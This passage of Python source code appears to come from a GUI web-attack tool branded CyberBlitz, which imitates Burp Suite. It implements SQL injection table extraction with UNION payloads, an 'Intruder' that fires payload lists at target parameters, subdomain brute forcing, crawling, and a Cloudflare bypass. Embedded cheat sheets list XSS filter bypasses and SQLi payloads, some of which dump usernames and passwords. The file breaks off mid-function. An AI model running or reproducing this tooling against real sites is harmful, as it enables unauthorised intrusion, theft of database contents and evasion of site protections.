        btn_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(btn_frame, text="Extract Tables", command=lambda: self.extract_tables(
            url_entry.get(), param_entry.get(), db_type.get(), result_text
        )).pack(side=tk.LEFT, padx=5)
        
        # Results
        result_text = scrolledtext.ScrolledText(main_frame, 
                                              wrap=tk.WORD,
                                              width=70,
                                              height=20,
                                              font=('Consolas', 10),
                                              bg='#16213e',
                                              fg='#e0e0e0')
        result_text.pack(fill=tk.BOTH, expand=True)
        
        result_text.insert(tk.END, "Database extraction ready\n")

    def extract_tables(self, url, param, db_type, result_text):
        """Extract database tables using SQL injection"""
        if not url or not param:
            messagebox.showwarning("Warning", "URL and parameter are required")
            return
            
        result_text.delete(1.0, tk.END)
        result_text.insert(tk.END, f"Starting database extraction from {url}\n")
        result_text.insert(tk.END, f"Target parameter: {param}\n")
        result_text.insert(tk.END, f"Database type: {db_type}\n\n")
        
        # Start extraction in background thread
        extract_thread = threading.Thread(
            target=self._perform_db_extraction,
            args=(url, param, db_type, result_text),
            daemon=True
        )
        extract_thread.start()

    def _perform_db_extraction(self, url, param, db_type, result_text):
        """Perform the actual database extraction"""
        try:
            # Test for SQL injection vulnerability first
            test_payload = "' OR '1'='1"
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            query[param] = [test_payload]
            
            new_query = "&".join(f"{k}={v[0]}" for k, v in query.items())
            test_url = parsed._replace(query=new_query).geturl()
            
            response = requests.get(test_url, timeout=10)
            if "error in your SQL syntax" not in response.text.lower():
                result_text.insert(tk.END, "Target doesn't appear to be vulnerable to SQL injection\n")
                return
                
            # Extract database tables
            if db_type == "MySQL":
                payload = f"' UNION SELECT table_name,2,3 FROM information_schema.tables-- -"
            elif db_type == "PostgreSQL":
                payload = f"' UNION SELECT table_name,2,3 FROM information_schema.tables-- -"
            elif db_type == "Oracle":
                payload = f"' UNION SELECT table_name,'2','3' FROM all_tables-- -"
            elif db_type == "SQL Server":
                payload = f"' UNION SELECT table_name,2,3 FROM information_schema.tables-- -"
            else:
                payload = f"' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'-- -"
            
            query[param] = [payload]
            new_query = "&".join(f"{k}={v[0]}" for k, v in query.items())
            extract_url = parsed._replace(query=new_query).geturl()
            
            response = requests.get(extract_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find tables in response (this is a simplified approach)
            tables = set()
            for row in soup.find_all('tr'):
                cells = row.find_all('td')
                if cells and cells[0].text.strip() not in ['1', '2', '3']:
                    tables.add(cells[0].text.strip())
            
            if tables:
                result_text.insert(tk.END, "\nFound tables:\n")
                for table in tables:
                    result_text.insert(tk.END, f"- {table}\n")
            else:
                result_text.insert(tk.END, "\nNo tables found in response\n")
        except Exception as e:
            result_text.insert(tk.END, f"\nError during extraction: {str(e)}\n")
        finally:
            result_text.insert(tk.END, "\nDatabase extraction finished\n")

    def show_subdomain_scanner(self):
        """Show subdomain scanner dialog"""
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showwarning("Warning", "Please enter a target URL first")
            return
            
        try:
            parsed = urlparse(url)
            domain = parsed.hostname
            
            sub_window = tk.Toplevel(self.master)
            sub_window.title(f"Subdomain Scanner: {domain}")
            sub_window.geometry("600x400")
            sub_window.configure(bg='#1a1a2e')
            
            # Wordlist selection
            wordlist_frame = ttk.Frame(sub_window, style='TFrame')
            wordlist_frame.pack(fill=tk.X, padx=10, pady=10)
            
            ttk.Label(wordlist_frame, text="Wordlist:").pack(side=tk.LEFT)
            wordlist = ttk.Combobox(wordlist_frame, 
                                   values=["Top 100", "Top 500", "Top 1000", "Custom"],
                                   state="readonly",
                                   width=12)
            wordlist.pack(side=tk.LEFT, padx=10)
            wordlist.set("Top 100")
            
            # Scan button
            scan_btn = ttk.Button(wordlist_frame, text="Scan", command=lambda: self.run_subdomain_scan(
                domain, wordlist.get(), result_text
            ))
            scan_btn.pack(side=tk.RIGHT)
            
            # Results
            result_text = scrolledtext.ScrolledText(sub_window, 
                                                  wrap=tk.WORD,
                                                  width=70,
                                                  height=20,
                                                  font=('Consolas', 10),
                                                  bg='#16213e',
                                                  fg='#e0e0e0')
            result_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
            
            result_text.insert(tk.END, f"Ready to scan subdomains for {domain}\n")
        except Exception as e:
            messagebox.showerror("Error", f"Subdomain scanner initialization failed: {str(e)}")

    def run_subdomain_scan(self, domain, wordlist_type, result_text):
        """Run subdomain scan in background thread"""
        result_text.delete(1.0, tk.END)
        result_text.insert(tk.END, f"Starting subdomain scan for {domain}...\n")
        
        scan_thread = threading.Thread(
            target=self._perform_subdomain_scan,
            args=(domain, wordlist_type, result_text),
            daemon=True
        )
        scan_thread.start()

    def _perform_subdomain_scan(self, domain, wordlist_type, result_text):
        """Perform the actual subdomain scan"""
        try:
            # Load appropriate wordlist
            if wordlist_type == "Top 100":
                wordlist = ["www", "mail", "ftp", "blog", "webmail", "test", "dev", "api", 
                           "admin", "secure", "portal", "app", "shop", "store", "support"]
            elif wordlist_type == "Top 500":
                wordlist = ["www", "mail", "ftp", "blog", "webmail", "test", "dev", "api", 
                           "admin", "secure", "portal", "app", "shop", "store", "support",
                           "cpanel", "whm", "webdisk", "ns1", "ns2", "smtp", "pop", "imap",
                           "m", "mobile", "static", "cdn", "images", "img", "media", "video",
                           "download", "uploads", "backup", "beta", "stage", "staging", "status",
                           "stats", "monitor", "dashboard", "internal", "intranet", "extranet",
                           "vpn", "remote", "ssh", "git", "svn", "db", "database", "mysql", "sql",
                           "oracle", "postgres", "redis", "memcached", "cache", "search", "solr",
                           "elastic", "kibana", "grafana", "prometheus", "alertmanager", "push",
                           "pull", "sync", "auth", "sso", "login", "signin", "signup", "register",
                           "account", "billing", "payment", "invoice", "shop", "store", "cart"]
            else:  # Top 1000
                wordlist = ["www", "mail", "ftp", "blog", "webmail", "test", "dev", "api", 
                           "admin", "secure", "portal", "app", "shop", "store", "support"] * 10  # Simplified for example
            
            found_subdomains = []
            
            # Test each subdomain
            for sub in wordlist:
                url = f"http://{sub}.{domain}"
                try:
                    response = requests.get(url, timeout=2, allow_redirects=False)
                    if response.status_code < 400:
                        found_subdomains.append(url)
                        result_text.insert(tk.END, f"Found: {url}\n")
                        result_text.see(tk.END)
                except:
                    pass
            
            result_text.insert(tk.END, f"\nScan completed. Found {len(found_subdomains)} subdomains.\n")
            if found_subdomains:
                result_text.insert(tk.END, "\nSubdomains:\n")
                for sub in found_subdomains:
                    result_text.insert(tk.END, f"- {sub}\n")
        except Exception as e:
            result_text.insert(tk.END, f"\nError during scan: {str(e)}\n")
        finally:
            result_text.insert(tk.END, "\nSubdomain scan finished\n")

    def show_intruder(self):
        """Show intruder tool (similar to Burp Suite)"""
        intruder = tk.Toplevel(self.master)
        intruder.title("Intruder")
        intruder.geometry("800x600")
        intruder.configure(bg='#1a1a2e')
        
        # Main frame
        main_frame = ttk.Frame(intruder, style='TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Target URL
        url_frame = ttk.Frame(main_frame, style='TFrame')
        url_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(url_frame, text="Target URL:", style='TLabel').pack(side=tk.LEFT)
        url_entry = ttk.Entry(url_frame, width=50, style='TEntry')
        url_entry.pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True)
        
        # Payload positions
        pos_frame = ttk.Frame(main_frame, style='TFrame')
        pos_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(pos_frame, text="Payload Positions:", style='TLabel').pack(side=tk.LEFT)
        pos_entry = ttk.Entry(pos_frame, width=50, style='TEntry')
        pos_entry.pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True)
        
        # Payloads
        payload_frame = ttk.Frame(main_frame, style='TFrame')
        payload_frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(payload_frame, text="Payloads:", style='TLabel').pack(anchor='w')
        payload_text = scrolledtext.ScrolledText(payload_frame, 
                                               wrap=tk.WORD,
                                               width=70,
                                               height=10,
                                               font=('Consolas', 9),
                                               bg='#16213e',
                                               fg='#e0e0e0')
        payload_text.pack(fill=tk.BOTH, expand=True)
        
        # Attack type
        attack_frame = ttk.Frame(main_frame, style='TFrame')
        attack_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(attack_frame, text="Attack Type:", style='TLabel').pack(side=tk.LEFT)
        attack_type = ttk.Combobox(attack_frame, 
                                 values=["Sniper", "Battering ram", "Pitchfork", "Cluster bomb"],
                                 state="readonly",
                                 width=15)
        attack_type.pack(side=tk.LEFT, padx=10)
        attack_type.set("Sniper")
        
        # Start button
        btn_frame = ttk.Frame(main_frame, style='TFrame')
        btn_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(btn_frame, text="Start Attack", command=lambda: self.start_intruder_attack(
            url_entry.get(), pos_entry.get(), payload_text.get("1.0", tk.END), attack_type.get(), result_text
        )).pack(side=tk.LEFT, padx=5)
        
        # Results
        result_frame = ttk.Frame(main_frame, style='TFrame')
        result_frame.pack(fill=tk.BOTH, expand=True)
        
        result_text = scrolledtext.ScrolledText(result_frame, 
                                              wrap=tk.WORD,
                                              width=70,
                                              height=15,
                                              font=('Consolas', 9),
                                              bg='#16213e',
                                              fg='#e0e0e0')
        result_text.pack(fill=tk.BOTH, expand=True)
        
        result_text.insert(tk.END, "Intruder ready\n")

    def start_intruder_attack(self, url, positions, payloads, attack_type, result_text):
        """Start intruder attack"""
        if not url:
            messagebox.showwarning("Warning", "Target URL is required")
            return
            
        result_text.delete(1.0, tk.END)
        result_text.insert(tk.END, f"Starting {attack_type} attack on {url}\n")
        result_text.insert(tk.END, f"Payload positions: {positions}\n\n")
        
        # Process payloads
        payload_list = [p.strip() for p in payloads.split('\n') if p.strip()]
        result_text.insert(tk.END, f"Loaded {len(payload_list)} payloads\n")
        
        # Start attack in background thread
        attack_thread = threading.Thread(
            target=self._perform_intruder_attack,
            args=(url, positions, payload_list, attack_type, result_text),
            daemon=True
        )
        attack_thread.start()

    def _perform_intruder_attack(self, url, positions, payloads, attack_type, result_text):
        """Perform the actual intruder attack"""
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            
            for payload in payloads:
                try:
                    # Simple implementation - replace all parameters with payload
                    new_query = {}
                    for param in query:
                        new_query[param] = [payload]
                    
                    attack_url = parsed._replace(query="&".join(f"{k}={v[0]}" for k, v in new_query.items())).geturl()
                    
                    start_time = time.time()
                    response = requests.get(attack_url, timeout=10)
                    elapsed = time.time() - start_time
                    
                    result_text.insert(tk.END, f"Payload: {payload} | Status: {response.status_code} | Size: {len(response.text)} | Time: {elapsed:.2f}s\n")
                    result_text.see(tk.END)
                except Exception as e:
                    result_text.insert(tk.END, f"Error with payload {payload}: {str(e)}\n")
        except Exception as e:
            result_text.insert(tk.END, f"\nAttack failed: {str(e)}\n")
        finally:
            result_text.insert(tk.END, "\nAttack completed\n")

    def show_repeater(self):
        """Show repeater tool (similar to Burp Suite)"""
        repeater = tk.Toplevel(self.master)
        repeater.title("Repeater")
        repeater.geometry("800x600")
        repeater.configure(bg='#1a1a2e')
        
        # Main frame
        main_frame = ttk.Frame(repeater, style='TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Request frame
        req_frame = ttk.Frame(main_frame, style='TFrame')
        req_frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(req_frame, text="Request:", style='TLabel').pack(anchor='w')
        self.req_text = scrolledtext.ScrolledText(req_frame, 
                                                wrap=tk.WORD,
                                                width=70,
                                                height=15,
                                                font=('Consolas', 9),
                                                bg='#16213e',
                                                fg='#e0e0e0')
        self.req_text.pack(fill=tk.BOTH, expand=True)
        
        # Buttons
        btn_frame = ttk.Frame(main_frame, style='TFrame')
        btn_frame.pack(fill=tk.X, pady=5)
        
        ttk.Button(btn_frame, text="Send", command=self.send_repeater_request).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Copy", command=self.copy_repeater_request).pack(side=tk.LEFT, padx=5)
        
        # Response frame
        res_frame = ttk.Frame(main_frame, style='TFrame')
        res_frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(res_frame, text="Response:", style='TLabel').pack(anchor='w')
        self.res_text = scrolledtext.ScrolledText(res_frame, 
                                                wrap=tk.WORD,
                                                width=70,
                                                height=15,
                                                font=('Consolas', 9),
                                                bg='#16213e',
                                                fg='#e0e0e0')
        self.res_text.pack(fill=tk.BOTH, expand=True)
        
        # Load current URL
        url = self.url_entry.get()
        if url:
            self.req_text.insert(tk.END, f"GET {url} HTTP/1.1\n")
            self.req_text.insert(tk.END, "Host: example.com\n")
            self.req_text.insert(tk.END, "User-Agent: CyberBlitz/4.0\n")
            self.req_text.insert(tk.END, "Accept: */*\n\n")

    def send_repeater_request(self):
        """Send request from repeater"""
        request_text = self.req_text.get("1.0", tk.END)
        if not request_text.strip():
            messagebox.showwarning("Warning", "Request is empty")
            return
            
        try:
            # Parse request (simplified)
            lines = request_text.split('\n')
            method, path, _ = lines[0].split(' ')
            url = f"http://{lines[1].split(': ')[1]}{path}"
            
            headers = {}
            for line in lines[2:]:
                if ': ' in line:
                    key, val = line.split(': ', 1)
                    headers[key] = val
            
            start_time = time.time()
            if method.upper() == "GET":
                response = requests.get(url, headers=headers, timeout=10)
            elif method.upper() == "POST":
                response = requests.post(url, headers=headers, timeout=10)
            else:
                response = requests.request(method, url, headers=headers, timeout=10)
            elapsed = time.time() - start_time
            
            self.res_text.delete(1.0, tk.END)
            self.res_text.insert(tk.END, f"HTTP/1.1 {response.status_code} {response.reason}\n")
            for key, val in response.headers.items():
                self.res_text.insert(tk.END, f"{key}: {val}\n")
            self.res_text.insert(tk.END, f"\n{response.text}\n")
            self.res_text.insert(tk.END, f"\nTime: {elapsed:.2f}s | Size: {len(response.text)} bytes\n")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send request: {str(e)}")

    def copy_repeater_request(self):
        """Copy request to clipboard"""
        request_text = self.req_text.get("1.0", tk.END)
        self.master.clipboard_clear()
        self.master.clipboard_append(request_text)
        self.update_status("Request copied to clipboard", "info")

    def show_decoder(self):
        """Show decoder tool (similar to Burp Suite)"""
        decoder = tk.Toplevel(self.master)
        decoder.title("Decoder")
        decoder.geometry("600x400")
        decoder.configure(bg='#1a1a2e')
        
        # Main frame
        main_frame = ttk.Frame(decoder, style='TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Input frame
        input_frame = ttk.Frame(main_frame, style='TFrame')
        input_frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(input_frame, text="Input:", style='TLabel').pack(anchor='w')
        self.decoder_input = scrolledtext.ScrolledText(input_frame, 
                                                     wrap=tk.WORD,
                                                     width=70,
                                                     height=8,
                                                     font=('Consolas', 9),
                                                     bg='#16213e',
                                                     fg='#e0e0e0')
        self.decoder_input.pack(fill=tk.BOTH, expand=True)
        
        # Encoding options
        encode_frame = ttk.Frame(main_frame, style='TFrame')
        encode_frame.pack(fill=tk.X, pady=5)
        
        ttk.Button(encode_frame, text="URL Encode", command=lambda: self.encode_decode('url_encode')).pack(side=tk.LEFT, padx=5)
        ttk.Button(encode_frame, text="URL Decode", command=lambda: self.encode_decode('url_decode')).pack(side=tk.LEFT, padx=5)
        ttk.Button(encode_frame, text="Base64 Encode", command=lambda: self.encode_decode('base64_encode')).pack(side=tk.LEFT, padx=5)
        ttk.Button(encode_frame, text="Base64 Decode", command=lambda: self.encode_decode('base64_decode')).pack(side=tk.LEFT, padx=5)
        
        # Output frame
        output_frame = ttk.Frame(main_frame, style='TFrame')
        output_frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(output_frame, text="Output:", style='TLabel').pack(anchor='w')
        self.decoder_output = scrolledtext.ScrolledText(output_frame, 
                                                      wrap=tk.WORD,
                                                      width=70,
                                                      height=8,
                                                      font=('Consolas', 9),
                                                      bg='#16213e',
                                                      fg='#e0e0e0')
        self.decoder_output.pack(fill=tk.BOTH, expand=True)

    def encode_decode(self, operation):
        """Perform encoding/decoding operation"""
        input_text = self.decoder_input.get("1.0", tk.END).strip()
        if not input_text:
            messagebox.showwarning("Warning", "Input is empty")
            return
            
        try:
            output = ""
            if operation == 'url_encode':
                output = requests.utils.quote(input_text)
            elif operation == 'url_decode':
                output = requests.utils.unquote(input_text)
            elif operation == 'base64_encode':
                output = base64.b64encode(input_text.encode()).decode()
            elif operation == 'base64_decode':
                output = base64.b64decode(input_text).decode()
            
            self.decoder_output.delete(1.0, tk.END)
            self.decoder_output.insert(tk.END, output)
        except Exception as e:
            messagebox.showerror("Error", f"Operation failed: {str(e)}")

    def show_comparer(self):
        """Show comparer tool (similar to Burp Suite)"""
        comparer = tk.Toplevel(self.master)
        comparer.title("Comparer")
        comparer.geometry("800x600")
        comparer.configure(bg='#1a1a2e')
        
        # Main frame
        main_frame = ttk.Frame(comparer, style='TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Dual text widgets
        dual_frame = ttk.Frame(main_frame, style='TFrame')
        dual_frame.pack(fill=tk.BOTH, expand=True)
        
        # Left text
        left_frame = ttk.Frame(dual_frame, style='TFrame')
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        ttk.Label(left_frame, text="Text 1:", style='TLabel').pack(anchor='w')
        self.compare_text1 = scrolledtext.ScrolledText(left_frame, 
                                                     wrap=tk.WORD,
                                                     width=35,
                                                     height=20,
                                                     font=('Consolas', 9),
                                                     bg='#16213e',
                                                     fg='#e0e0e0')
        self.compare_text1.pack(fill=tk.BOTH, expand=True)
        
        # Right text
        right_frame = ttk.Frame(dual_frame, style='TFrame')
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        ttk.Label(right_frame, text="Text 2:", style='TLabel').pack(anchor='w')
        self.compare_text2 = scrolledtext.ScrolledText(right_frame, 
                                                      wrap=tk.WORD,
                                                      width=35,
                                                      height=20,
                                                      font=('Consolas', 9),
                                                      bg='#16213e',
                                                      fg='#e0e0e0')
        self.compare_text2.pack(fill=tk.BOTH, expand=True)
        
        # Compare button
        btn_frame = ttk.Frame(main_frame, style='TFrame')
        btn_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(btn_frame, text="Compare", command=self.compare_texts).pack()

    def compare_texts(self):
        """Compare two texts and highlight differences"""
        text1 = self.compare_text1.get("1.0", tk.END)
        text2 = self.compare_text2.get("1.0", tk.END)
        
        if not text1 or not text2:
            messagebox.showwarning("Warning", "Both texts must contain content")
            return
            
        # Simple comparison - just show if they're equal
        if text1 == text2:
            messagebox.showinfo("Comparison", "Texts are identical")
        else:
            messagebox.showinfo("Comparison", "Texts are different")

    def show_cheat_sheets(self):
        """Show cheat sheets dialog"""
        cheats = tk.Toplevel(self.master)
        cheats.title("Cheat Sheets")
        cheats.geometry("800x600")
        cheats.configure(bg='#1a1a2e')
        
        # Main frame
        main_frame = ttk.Frame(cheats, style='TFrame')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Notebook for different cheat sheets
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True)
        
        # XSS cheat sheet
        xss_frame = ttk.Frame(notebook, style='TFrame')
        notebook.add(xss_frame, text="XSS")
        
        xss_text = scrolledtext.ScrolledText(xss_frame, 
                                           wrap=tk.WORD,
                                           width=70,
                                           height=25,
                                           font=('Consolas', 9),
                                           bg='#16213e',
                                           fg='#e0e0e0')
        xss_text.pack(fill=tk.BOTH, expand=True)
        
        xss_cheats = """
Basic XSS:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

Bypass Filters:
<scr<script>ipt>alert(1)</scr</script>ipt>
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=`javascript:alert("XSS")`>

DOM XSS:
#"><img src=x onerror=alert(1)>
javascript:alert(1)
'}-alert(1)-{'

Advanced:
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
"""
        xss_text.insert(tk.END, xss_cheats)
        
        # SQLi cheat sheet
        sqli_frame = ttk.Frame(notebook, style='TFrame')
        notebook.add(sqli_frame, text="SQLi")
        
        sqli_text = scrolledtext.ScrolledText(sqli_frame, 
                                            wrap=tk.WORD,
                                            width=70,
                                            height=25,
                                            font=('Consolas', 9),
                                            bg='#16213e',
                                            fg='#e0e0e0')
        sqli_text.pack(fill=tk.BOTH, expand=True)
        
        sqli_cheats = """
Basic SQLi:
' OR '1'='1
' OR 1=1--
" OR ""="
' OR ''='

Union-Based:
' UNION SELECT null,username,password FROM users--
' UNION SELECT 1,2,3,4,5--

Error-Based:
' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--

Blind:
' AND 1=1--
' AND 1=2--
' AND (SELECT substring(username,1,1) FROM users WHERE id=1)='a'--

Time-Based:
'; IF (1=1) WAITFOR DELAY '0:0:5'--
' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--
"""
        sqli_text.insert(tk.END, sqli_cheats)

    def start_spider(self):
        """Start spidering the target"""
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showwarning("Warning", "Please enter a target URL first")
            return
            
        try:
            parsed = urlparse(url)
            if not parsed.scheme:
                url = "http://" + url
            
            self.update_status(f"Starting spider on {url}", "info")
            
            spider_thread = threading.Thread(
                target=self._perform_spider,
                args=(url,),
                daemon=True
            )
            spider_thread.start()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start spider: {str(e)}")

    def _perform_spider(self, url):
        """Perform spidering of the target"""
        try:
            visited = set()
            queue = [url]
            domain = urlparse(url).netloc
            
            while queue and not self.scanner.stop_event.is_set():
                current_url = queue.pop(0)
                
                if current_url in visited:
                    continue
                    
                visited.add(current_url)
                self.update_status(f"Spidering: {current_url}", "info")
                
                try:
                    response = requests.get(current_url, timeout=10)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links on page
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        absolute_url = urljoin(current_url, href)
                        
                        # Only follow links within the same domain
                        if urlparse(absolute_url).netloc == domain and absolute_url not in visited:
                            queue.append(absolute_url)
                except requests.RequestException as e:
                    self.update_status(f"Error spidering {current_url}: {str(e)}", "error")
                
                time.sleep(0.5)  # Rate limiting
            
            self.update_status(f"Spider completed. Found {len(visited)} URLs.", "success")
        except Exception as e:
            self.update_status(f"Spider failed: {str(e)}", "error")

    def on_closing(self):
        """Handle window closing event"""
        if self.scanning:
            if messagebox.askokcancel("Quit", "Scan is in progress. Are you sure you want to quit?"):
                self.scanner.stop()
                self.save_config()
                self.db_connection.close()
                self.master.destroy()
        else:
            self.save_config()
            self.db_connection.close()
            self.master.destroy()

class ScannerEngine:
    def __init__(self, status_callback, vuln_callback, progress_callback, page_count_callback, db_callback):
        self.stop_event = threading.Event()
        self.pause_event = threading.Event()
        self.visited = set()
        self.lock = threading.Lock()
        self.cloudflare_bypass = False
        
        # Configure session with retry strategy
        self.session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        self.ua = UserAgent()
        self.session.headers.update({'User-Agent': self.ua.random})
        self.session.verify = True
        self.timeout = 10
        self.rate_limit = 0.5
        self.max_threads = 10
        self.max_depth = 3
        self.max_pages = 1000
        
        # Callbacks
        self.status_callback = status_callback
        self.vuln_callback = vuln_callback
        self.progress_callback = progress_callback
        self.page_count_callback = page_count_callback
        self.db_callback = db_callback
        
        # Modules
        self.modules = {
            'xss': XSSDetector(),
            'sqli': SQLiDetector(),
            'lfi': LFIDetector(),
            'rce': RCEDetector(),
            'ssrf': SSRDetector(),
            'xxe': XXEDetector(),
            'tech': TechDetector(),
            'idor': IDORDetector(),
            'csrf': CSRFDetector(),
            'ssti': SSTIDetector(),
            'redirect': OpenRedirectDetector(),
            'cors': CORSDetector()
        }
        
        # Statistics
        self.pages_scanned = 0
        self.start_time = None
        self.paused = False
        self.thread_local = threading.local()

    def configure(self, rate_limit=0.5, max_threads=10, max_depth=3, timeout=10):
        """Configure scanner settings"""
        self.rate_limit = rate_limit
        self.max_threads = max_threads
        self.max_depth = max_depth
        self.timeout = timeout

    def configure_auth(self, auth_type, auth_details):
        """Configure authentication"""
        if auth_type == "Basic":
            username, password = auth_details.split(':', 1)
            self.session.auth = (username.strip(), password.strip())
        elif auth_type == "Cookie":
            name, value = auth_details.split('=', 1)
            self.session.cookies.set(name.strip(), value.strip())
        elif auth_type == "Bearer Token":
            self.session.headers['Authorization'] = f"Bearer {auth_details.strip()}"
        elif auth_type == "OAuth":
            client_id, client_secret = auth_details.split(':', 1)
            # Simplified OAuth implementation
            token_url = "https://oauth.example.com/token"
            data = {
                'grant_type': 'client_credentials',
                'client_id': client_id.strip(),
                'client_secret': client_secret.strip()
            }
            response = requests.post(token_url, data=data)
            if response.status_code == 200:
                token = response.json().get('access_token')
                self.session.headers['Authorization'] = f"Bearer {token}"
        elif auth_type == "JWT":
            self.session.headers['Authorization'] = f"Bearer {auth_details.strip()}"

    def scan(self, start_url, scan_type="Full Scan"):
        """Main scanning method"""
        try:
            self.stop_event.clear()
            self.pause_event.clear()
            self.start_time = time.time()
            self.pages_scanned = 0
            self.status_callback(f"Starting {scan_type} on {start_url}", "info")
            
            # Parse URL and ensure it has scheme
            parsed = urlparse(start_url)
            if not parsed.scheme:
                start_url = "http://" + start_url
                parsed = urlparse(start_url)
            
            # Get network information
            self.show_network_info(start_url)
            
            # Determine what to scan based on scan type
            selected_modules = self.get_modules_for_scan_type(scan_type)
            
            # Start crawling
            self.crawl(start_url, selected_modules)
            
            if not self.stop_event.is_set():
                elapsed = time.time() - self.start_time
                self.status_callback(
                    f"Scan completed. Found {len(self.visited)} pages in {elapsed:.2f} seconds.", 
                    "success"
                )
                
                # Run technology detection at the end
                if 'tech' in self.modules and 'tech' not in selected_modules:
                    self.status_callback("Running technology detection...", "info")
                    tech_findings = self.modules['tech'].scan(start_url, "")
                    for finding in tech_findings:
                        self.vuln_callback(finding)
        except Exception as e:
            self.status_callback(f"Scan failed: {str(e)}", "error")
            logger.exception("Scan failed")
        finally:
            self.stop_event.set()

    def get_modules_for_scan_type(self, scan_type):
        """Get modules to run based on scan type"""
        scan_types = {
            'Full Scan': ['xss', 'sqli', 'lfi', 'rce', 'ssrf', 'xxe', 'idor', 'csrf', 'ssti', 'tech', 'redirect', 'cors'],
            'Quick Scan': ['xss', 'sqli', 'lfi', 'tech', 'redirect'],
            'XSS Only': ['xss'],
            'SQLi Only': ['sqli'],
            'LFI/RFI': ['lfi'],
            'RCE': ['rce'],
            'SSRF': ['ssrf'],
            'XXE': ['xxe'],
            'Custom': ['xss', 'sqli', 'tech']
        }
        return scan_types.get(scan_type, ['xss', 'sqli', 'tech'])

    def crawl(self, url, modules, depth=0):
        """Recursive crawling function"""
        if depth > self.max_depth or self.stop_event.is_set() or self.paused:
            return

        try:
            with self.lock:
                if url in self.visited:
                    return
                self.visited.add(url)
            
            self.status_callback(f"Scanning: {url}", "info")
            
            # Get page content with rate limiting
            time.sleep(self.rate_limit)
            response = self.make_request(url)
            if not response:
                return
                
            html = response.text
            self.pages_scanned += 1
            self.page_count_callback(self.pages_scanned)
            self.progress_callback(len(self.visited), len(self.visited) + 10)  # Estimate
            
            # Run selected modules
            findings = []
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = []
                for module_name in modules:
                    if module_name == 'tech':
                        continue  # Run tech detection at the end
                    module = self.modules[module_name]
                    future = executor.submit(module.scan, url, html)
                    future.add_done_callback(self.handle_findings)
                    futures.append(future)
                
                wait(futures)
            
            # Extract and crawl links
            soup = BeautifulSoup(html, 'html.parser')
            links = {urljoin(url, a['href']) for a in soup.find_all('a', href=True) 
                    if urlparse(urljoin(url, a['href'])).netloc == urlparse(url).netloc}
            
            # Process links in parallel
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                for link in links:
                    if link not in self.visited and not self.stop_event.is_set() and not self.paused:
                        executor.submit(self.crawl, link, modules, depth + 1)
                        
        except Exception as e:
            self.status_callback(f"Error scanning {url}: {str(e)}", "error")
            logger.error(f"Error scanning {url}: {str(e)}")

    def make_request(self, url):
        """Make HTTP request with error handling and Cloudflare bypass"""
        domain = urlparse(url).netloc
        
        # Check if we need to use Cloudflare bypass for this domain
        if self.cloudflare_bypass:
            return self._make_request_with_cloudscraper(url)
            
        try:
            response = self.session.get(
                url, 
                timeout=self.timeout,
                allow_redirects=False,
                headers={'User-Agent': self.ua.random}
            )
            
            # Check if Cloudflare protection is detected
            if response.status_code in [403, 503] and 'cloudflare' in response.headers.get('Server', '').lower():
                self.status_callback(f"Cloudflare detected on {url}, activating bypass", "warning")
                return self._make_request_with_cloudscraper(url)
                
            return response
        except requests.RequestException as e:
            self.status_callback(f"Request failed for {url}: {str(e)}", "warning")
            return None

    def _make_request_with_cloudscraper(self, url):
        """Use cloudscraper to bypass Cloudflare protection"""
        try:
            if not hasattr(self.thread_local, "scraper"):
                self.thread_local.scraper = cloudscraper.create_scraper()
            return self.thread_local.scraper.get(url, timeout=self.timeout)
        except Exception as e:
            self.status_callback(f"Cloudflare bypass failed for {url}: {str(e)}", "error")
            return None

    def handle_findings(self, future):
        """Handle findings from module scans"""
        try:
            findings = future.result()
            for finding in findings:
                self.vuln_callback(finding)
                self.db_callback(finding)
        except Exception as e:
            logger.error(f"Error processing findings: {str(e)}")

    def test_url(self, url):
        """Test a single URL for all vulnerabilities"""
        try:
            self.status_callback(f"Testing URL: {url}", "info")
